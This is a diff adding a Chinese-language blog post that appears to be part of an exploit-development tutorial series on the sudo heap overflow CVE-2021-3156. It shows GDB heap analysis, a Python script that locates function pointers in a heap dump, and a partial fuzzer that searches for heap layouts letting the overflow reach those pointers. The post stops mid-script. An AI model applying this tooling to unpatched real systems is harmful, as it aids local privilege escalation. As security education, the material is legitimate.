@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<head>
+<meta charset="UTF-8" /><title>PureWeb Blog-SUDO堆溢出提权：从fuzz到exp [3]</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css" /><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>  <script>    document.querySelectorAll('code').forEach((code) => {      if (!code.classList.length) {        code.classList.add('language-bash');      }    });  </script>	<script>		document.addEventListener('DOMContentLoaded', (event) => {			hljs.highlightAll();		});	</script><link rel="stylesheet" href="/TestRepogithub.css">
+<link rel="stylesheet" href="/TestRepospeciou.css"
+</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/TestRepo">Joe1sn's Cabin</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link active" href="/TestRepo" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/TestRepoarchives/"target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn"target="_blank">GITHUB</a></li></ul></nav></header></div><div id="write" class>
+<div id="write" class>
+<div class="typora-export os-windows"><div id="write" class>
+<p><strong>2022-04-14 07:40:53</strong></p>
+<p>前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/</p>
+<p>受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程</p>
+<p>原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx</p>
+<p>原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/</p>
+<p>原作者代码仓库：https://github.com/LiveOverflow/pwnedit</p>
+<!-- more -->
+<blockquote>
+<p>My previous blog: https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/</p>
+<p>I was inspired by the LiveOverflow's Sudo Vulnerability Walkthrough on youtube, but i found there's no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this &quot;from fuzz to exploit&quot; series.</p>
+<p>Original Videos: https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx</p>
+<p>Original Blog: https://liveoverflow.com/why-pick-sudo-research-target-part-1/</p>
+<p>Source Project Code: https://github.com/LiveOverflow/pwnedit</p>
+</blockquote>
+<hr />
+<blockquote>
+<p>本节内容：</p>
+<p>Discussing Heap Exploit Strategies for sudo - Ep. 09</p>
+<p>Developing a Tool to Find Function Pointers on The Heap | Ep. 10</p>
+<p>Fuzzing Heap Layout to Overflow Function Pointers | Ep. 11</p>
+<p>Developing GDB Extension for Heap Exploitation | Ep. 12</p>
+</blockquote>
+<h1>编写exp思路</h1>
+<p>对于CTF中常见的堆思路是通过堆分配算法，使用<code>free</code>、<code>malloc</code>进行exp的编写，所以一般会出现一些菜单让你使用这些功能。<strong>本质上是攻击堆分配算法</strong></p>
+<p>但是在漏洞利用中，只存在这一个堆溢出，我们无法进行系列的<code>free</code>、<code>malloc</code>，所以思路是能否攻击堆内的有效数据，尝试找到堆内的函数指针或者其他有用的数据。<strong>本质上是攻击堆上的数据</strong></p>
+<h2>GDB调试</h2>
+<p>不适用asan重新编译后，使用<strong>GEF</strong>分析crash时堆的分布</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/532a062a01ed40da463ddb63ede2b010.png" alt="image-20220414081956697" /></p>
+<p>一个很明显的堆溢出，再看看出发时的堆分布</p>
+<p>断点</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/977a9e1186a3d96c3b29ef7214e2f822.png" alt="image-20220414082506061" /></p>
+<p>堆chunk</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/929d8e8804974a002194405514a80b0c.png" alt="image-20220414082234355" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/cf2f151144da211172788131fd8df6bb.png" alt="image-20220414082408083" /></p>
+<p>再次到达断点，堆溢出</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/7da088de496daf242ff6f08f51273c77.png" alt="image-20220414083507789" /></p>
+<h2>困难与解决</h2>
+<p>这样的堆分配情况让我们很难使用堆风水去调整堆分配，并且在程序运行中会遇到各种何样的内存分配情况，哪怕是不一样的长度都会造成堆分配的不同，进而让数据分配到不同的地方。</p>
+<p>如何解决，有两个思路</p>
+<ul>
+<li>
+<p>作者收到了<a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">原文报告</a>的启发，尝试编写小工具去“控制”堆</p>
+<blockquote>
+<p>To implement this initial technique, we wrote a rudimentary brute-forcer
+that executes Sudo inside gdb, overflows the &quot;user_args&quot; buffer, and
+randomly selects the following parameters:</p>
+</blockquote>
+</li>
+<li>
+<p>通过覆写其他堆中的函数指针来实现rce或者提权</p>
+</li>
+</ul>
+<h1>函数指针工具编写</h1>
+<h2>思路分析</h2>
+<p>从gdb的<code>vmmap</code>指令我们知道程序有哪些代码段</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/aafecabf6b9432e4732b8135953de8fe.png" alt="image-20220414084942194" /></p>
+<p>如果在堆内存中带有<code>x</code>即可执行权限的话就可能存在能够被我们利用的函数指针</p>
+<h2>工具编写</h2>
+<ol>
+<li>
+<p>写入但是没有溢出的情况下，在漏洞函数断点，dump内存</p>
+<pre><code>dump binary memory /pwd/heap 0x005555555f9000 0x00555555637000
+</code></pre>
+</li>
+<li>
+<p>复制<code>vmmap</code>结果，尝试分析出有可执行权限的内存地址</p>
+<pre><code>0x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo
+0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo
+0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo
+0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo
+0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo
+0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]
+0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-
+0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so
+0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so
+0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so
+0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so
+0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so
+0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-
+0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
+0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE
+0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-
+0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-
+0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
+0x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
+0x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
+0x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
+0x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
+0x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
+0x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-
+0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0
+0x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0
+0x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0
+0x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0
+0x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0
+0x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-
+0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so
+0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so
+0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so
+0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so
+0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so
+0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-
+0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]
+0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]
+0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-
+0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]
+</code></pre>
+</li>
+<li>
+<p>编写python脚本</p>
+<pre><code class="language-python">vmmap='''
+0x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo
+0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo
+0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo
+0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo
+0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo
+0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]
+0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-
+0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so
+0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so
+0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so
+0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so
+0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so
+0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-
+0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
+0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE
+0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-
+0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
+0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-
+0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
+0x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
+0x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
+0x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
+0x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
+0x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
+0x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-
+0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0
+0x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0
+0x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0
+0x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0
+0x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.0
+0x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-
+0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so
+0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so
+0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so
+0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so
+0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so
+0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-
+0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]
+0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]
+0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
+0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw-
+0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]
+'''
+
+import struct
+
+memmap = []
+for mem in vmmap.splitlines():
+    if 'r-x' in mem:
+        start, end, size, perm, f = mem.split(' ')
+        start = int(start, 16)
+        end = int(end, 16)
+        memmap.append((start, end))
+
+with open('/pwd/heap','rb') as f:
+    heap = f.read()
+
+n = 0x41
+
+for i in range(0, len(heap), 8):
+    heap_addr = i+0x005555555f9000
+    b = heap[i:i+8]
+    q = struct.unpack('Q', b)[0]
+    for mem in memmap:
+        if q&gt;=mem[0] and q&lt;=mem[1]:
+            # print(f&quot;0x{heap_addr:016x}: {q:016x} {b}&quot;)
+            print(f&quot;set *0x{heap_addr:016x} = 0x&quot;+(hex(n)[2:]*5))
+            n += 1
+    if 0x000055555561b4d0 == heap_addr:
+            print(f&quot;0x{heap_addr:016x}: our [buffer]&quot;)
+</code></pre>
+</li>
+<li>
+<p>得到结果</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/449bbaa76e8ed77743a08a0c31acb492.png" alt="image-20220414092034283" /></p>
+<p>能堆溢出的堆在最下面，不能覆写任何函数指针，艹</p>
+</li>
+<li>
+<p>重新分析，判断找到的函数是否真的被执行了，作者这里修改了他的脚本</p>
+<pre><code class="language-python">n = 0x41
+
+for i in range(0, len(heap), 8):
+    heap_addr = i+0x005555555f9000
+    b = heap[i:i+8]
+    q = struct.unpack('Q', b)[0]
+    for mem in memmap:
+        if q&gt;=mem[0] and q&lt;=mem[1]:
+            # print(f&quot;0x{heap_addr:016x}: {q:016x} {b}&quot;)
+            print(f&quot;set *0x{heap_addr:016x} = 0x&quot;+(hex(n)[2:]*5))
+            n += 1
+    if 0x000055555561b4d0 == heap_addr:
+            print(f&quot;0x{heap_addr:016x}: our [buffer]&quot;)
+</code></pre>
+<p>生成不会造成<code>crash</code>的文件</p>
+<pre><code> echo -en &quot;0edit\x00-s\x000000000&quot; &gt; /tmp/normal
+</code></pre>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/f75b0c385d066b7147fb7d12818f4fbf.png" alt="image-20220414092905786" /></p>
+<p>在gdb中设置这些值</p>
+<pre><code>set *0x00005555556149a8 = 0x4141414141
+set *0x00005555556149b0 = 0x4242424242
+set *0x0000555555615260 = 0x4343434343
+set *0x0000555555615268 = 0x4444444444
+set *0x0000555555617e00 = 0x4545454545
+set *0x0000555555617eb0 = 0x4646464646
+set *0x0000555555618378 = 0x4747474747
+set *0x0000555555618398 = 0x4848484848
+set *0x00005555556183b8 = 0x4949494949
+set *0x00005555556183d8 = 0x4a4a4a4a4a
+set *0x00005555556184d8 = 0x4b4b4b4b4b
+set *0x0000555555619b40 = 0x4c4c4c4c4c
+set *0x000055555561a0b0 = 0x4d4d4d4d4d
+</code></pre>
+<p>取消断点继续，应该就会出现一些报错了</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1f7019cfc44dd23bc8341b49638dfff1.png" alt="image-20220414103302900" /></p>
+<p>&gt;&gt;问题</p>
+<ul>
+<li>
+<p>没有出现报错，并且直接执行了</p>
+<p>脚本的相关的地址写错了</p>
+</li>
+</ul>
+<p>发现一个红黑树!</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/d2970fcab1ca82e6035b8dc63f429930.png" alt="image-20220414103855166" /></p>
+<p>结果看到<code>compar</code>变量被我们覆盖了，说明函数真的被调用了，如果我们能覆盖<code>compar</code>地址，那么就能改写函数指针。重复这些过程就可以找到更多的函数指针。比如修改输入类型，然后把输入换成普通输入，<code>set *0x000055555561a0b0 = 0x4d4d4d4d4d</code>换掉，得到另一个crash</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/8f92f140a02788a9be9ae451e5e482b2.png" alt="image-20220415105540238" /></p>
+</li>
+</ol>
+<h1>强制堆分配</h1>
+<p>在上一节中，能溢出的buffer位于最底层，不能更改能被使用的函数指针，所以尝试暴力取溢出长度，看看能不能分配到上面一点的位置。</p>
+<p>核心思想是随机输入到sudoedit，然后调用上节找到的函数时，打印该函数指针和打印堆溢出的chunk</p>
+<h2>改写sudo源码</h2>
+<p>真实环境下的sudo和测试下的sudo是两个二进制文件，为了贴近正式的环境，要尽量的贴近真实情况下的sudo</p>
+<ol>
+<li>
+<p>添加打印参数Chunk地址</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2cef5162ba6a14905755f21063a29737.png" alt="image-20220414120240051" /></p>
+</li>
+<li>
+<p>已上一节的红黑树为例，打印<code>compar</code>的值</p>
+<p>~~忘写分号了~~</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/0277679ee8b79157542b7ca86679262e.png" alt="image-20220414122222094" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/677cba2f8962fddb6943fa56da03b8d1.png" alt="image-20220414122448875" /></p>
+</li>
+</ol>
+<pre><code>./configure &amp;&amp; make
+ln -s /pwd/sudo_test/src/.libs/sudo ./src/.libs/sudoedit
+</code></pre>
+<p>作者在这里踩了坑，我想复现下，不想看的可以略过</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/4ecd2bb3d6b06eefcd140b1cbc096af3.png" alt="image-20220414123642675" /></p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/cc0e7e9154dd2ed5e98aae914cc289f4.png" alt="image-20220414123801800" /></p>
+<p>虽然报错的方式不一样，但是结果和原因都是一样的。一个都是libsudo这个库找不到，作者的问题是使用的是系统变量中的库，<strong>但是这个库不含有<code>printf</code>即其他输出，自然也就没法打印字符串</strong></p>
+<p>&gt;&gt;问题</p>
+<ul>
+<li>
+<p>没有反应</p>
+<p>找找是不是代码写的文件是其他文件的代码</p>
+</li>
+</ul>
+<p>所以使用<code>make install</code>安装方法就好了，只要之前make过一次之后就都可以了</p>
+<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a9391826eb45d490d44f3519b94854f8.png" alt="image-20220414212057228" /></p>
+<p>堆溢出发生时，程序并不会立即<code>crash</code>，而是会进入到红黑树的部分，但是能溢出的<code>user_args</code>地址在<code>rbtree1</code>地址后面，所以依然无法利用</p>
+<h2>暴力测试脚本</h2>
+<p>尝试构造不同的输入，看看能不能有路径可以把函数指针放在我们能溢出的chunk后面的</p>
+<ol>
+<li>
+<p>输入来源</p>
+<ul>
+<li>stdin</li>
+<li>文件(files)</li>
+<li>协议参数(arguments)</li>
+<li>环境变量(env vars)</li>
+</ul>
+</li>
+<li>
+<p>设置长度</p>
+<pre><code class="language-python"># define some common size values usable for different inputs
+_SIZES = [i for i in range(0,0xff)]
+_SIZES += [2**i for i in range(0,15)]
+_SIZES += [(2**i)+1 for i in range(0,15)]
+_SIZES += [(2**i)-1 for i in range(0,15)]
+_SIZES += ([0]*50)
+</code></pre>
+</li>
+<li>
+<p>sudo参数协议(sudo help)</p>
+<pre><code class="language-python"># define some flags from sudo -h
+ARG1 = [&quot;-A&quot;,&quot;-B&quot;,&quot;-E&quot;,&quot;-e&quot;,&quot;-H&quot;,&quot;-K&quot;,&quot;-k&quot;,&quot;-l&quot;,&quot;-n&quot;,&quot;-P&quot;,&quot;-S&quot;,&quot;-s&quot;]
+ARG1 += [None, None, None, None, None, None, None]
+ARG2 = _SIZES
+ARG3 = _SIZES
+HOSTNAME = _SIZES
+ENV = _SIZES
+</code></pre>
+</li>
+<li>
+<p>设置测试集</p>
+<pre><code class="language-python"># dump a testcase into a logfile
+def dump_file(fname, lines, ptrs, arg, env, key):
+    # create the folders if they don't exist
+    directory = os.path.dirname(fname)
+    if not os.path.exists(directory):
+        os.makedirs(directory)
+    
+    # don't write the dump file if it's already too large
+    if os.path.isfile(fname) and Path(fname).stat().st_size &gt; 200000:
+        return
+
+    # write to file
+    with open(fname, 'a+') as f:
+        f.write(&quot;----------------------------\n&quot;)
+        f.write(lines[1].decode('ascii'))
+        if key:
+            distance = ptrs[key] - ptrs[b'user_args']
+            f.write(f&quot;user_args &lt; {key.decode('ascii')}\n&quot;)
+            f.write(f&quot;distance: 0x{distance:x}\n&quot;)
+        if key:
+            f.write(f&quot;0x{ptrs[b'user_args']:016x} &lt; 0x{ptrs[key]:016x}\n&quot;)
+        f.write(&quot;args: sudoedit &quot;)
+        f.write(&quot; &quot;.join(arg))
+        f.write(&quot;\n\n&quot;)
+        for k in env:
+            f.write(f&quot;{k}={env[k]}\n&quot;)
+        f.write(&quot;\n&quot;)
+        f.write(lines[0].decode('ascii'))
+        f.write(&quot;\n&quot;)
+
+        test = {}
+        test['arg'] = arg
+        test['env'] = env
+        f.write(json.dumps(test))
+        f.write(&quot;\n\n&quot;)
+
+# this will run sudoedit with a set of arguments and environment variables
+def run_sudoedit(arg, env):
+    print(&quot;-------------&quot;)
+    # disable stdout buffering with stdbuf wrapping around sudoedit
+    # and add the commandline arguments
+    _cmd = [&quot;/usr/bin/stdbuf&quot;, &quot;-o0&quot;, &quot;/usr/local/bin/sudoedit&quot;] + arg
+
+    # execute it
+    p = subprocess.Popen(_cmd, env=env, bufsize=0, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    try:
+        # send some newlines and check if we get any output
+        lines = p.communicate(b&quot;x\nx\nx\nx\n&quot;, timeout=0.1)
+    except subprocess.TimeoutExpired:
+        # terminate on timeout
+        p.terminate()
+        lines = p.communicate()
+    if p.returncode == -11:
+        print(f&quot;SEGFAULT&quot;)
+    
+    # read the list of function pointers
+    ptrs = {}
+    skipping = True
+    for line in lines[0].splitlines():
+        key,val = line.split(b'=')
+        if key == b'user_args':
+            skipping = False
+        if not skipping:
+            ptrs[key] = int(val,16)
+    
+    # go through all function pointers
+    if ptrs and b'user_args' in ptrs:
+        for key in ptrs:
+            if key != b'user_args':
+                # is our overflow buffer before a function pointer?
+                if ptrs[b'user_args'] &lt; ptrs[key]:
+                    distance = ptrs[key] - ptrs[b'user_args']
+                    if distance&lt;14000:
+                        fname = f'{FOLDER}/{distance}'
+                        dump_file(fname, lines, ptrs, arg, env, key)
+
+                        # did we get a segfault?
+                        if p.returncode == -11:
+                            fname = f&quot;{FOLDER}/crashes/segfault_{distance}&quot;
+                            dump_file(fname, lines, ptrs, arg, env, None)
+                            return
+                        return
+
+ALPHABET = '0123456789ABCDEFGHIKLMNOPQRSTUVWXYZ'
+</code></pre>
+</li>
+<li>
+<p>fuzz主要功能</p>
+<pre><code class="language-python"># fuzz loop
+while True:
+    # select random size values
+    arg1 = random.choice(ARG1)
+    rand_arg2_size = random.choice(ARG2)
+    rand_arg3_size = random.choice(ARG3)
+    rand_hostname_size = random.choice(HOSTNAME)
+    rand_env_size = random.choice(ENV)
+    arg = []
+    env = {}
+
+    # arguments
+    # ... -s AAAAAAA\ ...
+    if arg1:
+        arg.append(arg1)
+    arg.append(&quot;-s&quot;)
+    arg.append(random.choice(ALPHABET)*rand_arg2_size + &quot;\\&quot;)
+    if rand_arg3_size:
+        arg.append(random.choice(ALPHABET)*rand_arg3_size)
+        
+    # environment variables
+    if rand_hostname_size:
